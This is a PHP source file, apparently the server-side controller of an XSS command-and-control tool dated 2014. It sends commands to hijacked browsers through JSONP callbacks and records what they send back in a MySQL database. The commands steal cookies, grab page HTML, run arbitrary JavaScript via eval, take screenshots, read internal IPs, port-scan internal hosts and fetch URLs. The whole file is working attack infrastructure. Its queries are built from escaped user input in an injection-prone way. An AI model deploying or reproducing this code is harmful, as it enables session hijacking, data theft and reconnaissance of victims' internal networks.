<?php

/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.20 14:53
 * 1.GETCOOKIE
    2.GETHTML
    3.ALERT
 */
error_reporting(0);
header("Content-type: text/html; charset=utf-8");
$thetime = gmdate('Y-m-d H:i:s', time() + 3600 * 8);
require_once '../config/mysql_conn.php';
require_once '../config/function_ip.php';
$domain_get = base64_encode(htmlspecialchars(addslashes($_GET['domain'])));
$domain = base64_encode(htmlspecialchars(addslashes($_POST['domain'])));
$ip=base64_encode(htmlspecialchars(addslashes(getIP())));
$cookie=htmlspecialchars(addslashes($_POST['cookie']));
$html=htmlspecialchars(addslashes($_POST['html']));
$geturlhtml=htmlspecialchars(addslashes($_POST['geturlhtml']));
$res=htmlspecialchars(addslashes($_POST['res']));
$pic=htmlspecialchars(addslashes($_POST['pic']));
$pic_res='<img src="'.$pic.'">';
$getnetworkip=htmlspecialchars(addslashes($_POST['getnetworkip']));
$evalres=htmlspecialchars(addslashes($_POST['evalres']));
$portscan=htmlspecialchars(addslashes($_POST['portscan'])).' | ';
$query_res= mysql_query("SELECT * FROM `pxss_cmd` WHERE `domain`='{$domain_get}' AND `ip`='{$ip}' AND isnull(res) OR `res`='>>>'");
mysql_query("UPDATE `pxss_project` SET `datetime` = '{$thetime}' WHERE `project_domain` = '{$domain_get}' AND `project_ip`='{$ip}'");
$power_res=mysql_fetch_array($query_res);
if($power_res['cmd']==1)
{
    echo 'success_jsonpCallback({"cookie":"cookie"})';
}
else if($power_res['cmd']==2){
    echo 'success_jsonpCallback({"GetHtml":"GetHtml"})';
}
else if($power_res['cmd']==3){
    echo 'success_jsonpCallback({"alert":"'.$power_res['connect'].'"})';
}else if($power_res['cmd']==4)
{
    echo 'success_jsonpCallback({"eval":"'.$power_res['connect'].'"})';
}else if($power_res['cmd']==5)
{
    echo 'success_jsonpCallback({"pic":"pic"})';
}
else if($power_res['cmd']==6)
{
    echo 'success_jsonpCallback({"getnetworkip":"getnetworkip"})';
}
else if($power_res['cmd']==7)
{
    echo 'success_jsonpCallback({"portscan":"'.$power_res['connect'].'"})';
}
else if($power_res['cmd']==8)
{
    echo 'success_jsonpCallback({"geturlhtml":"'.$power_res['connect'].'"})';
}

if( $cookie)
{
   mysql_query("UPDATE `pxss_cmd` SET `res`='{$cookie}' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=1)");

}
if($html && $html!='')
{
   mysql_query("UPDATE `pxss_cmd` SET `res`='{$html}' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=2)");

}
if($res)
{
    mysql_query("UPDATE `pxss_cmd` SET `res`='success' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='{$domain}' AND `ip`='{$ip}' AND `cmd`=3)");

}
if($evalres && $evalres!='')
{
    mysql_query("UPDATE `pxss_cmd` SET `res`='success' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=4)");
}

if($pic)
{
      mysql_query("UPDATE `pxss_cmd` SET `res`='$pic_res' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=5)");

}
if($getnetworkip)
{
      mysql_query("UPDATE `pxss_cmd` SET `res`='$getnetworkip' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=6)");

}
if($portscan)
{
 mysql_query("UPDATE `pxss_cmd` SET `res`=concat(`res`,'$portscan') WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=7)");

}
if($geturlhtml)
{
      mysql_query("UPDATE `pxss_cmd` SET `res`='$geturlhtml' WHERE datetime=(SELECT MAX(datetime) from (SELECT * FROM `pxss_cmd` where 1) as res WHERE `domain`='$domain' AND `ip`='$ip' AND `cmd`=8)");   
}
?>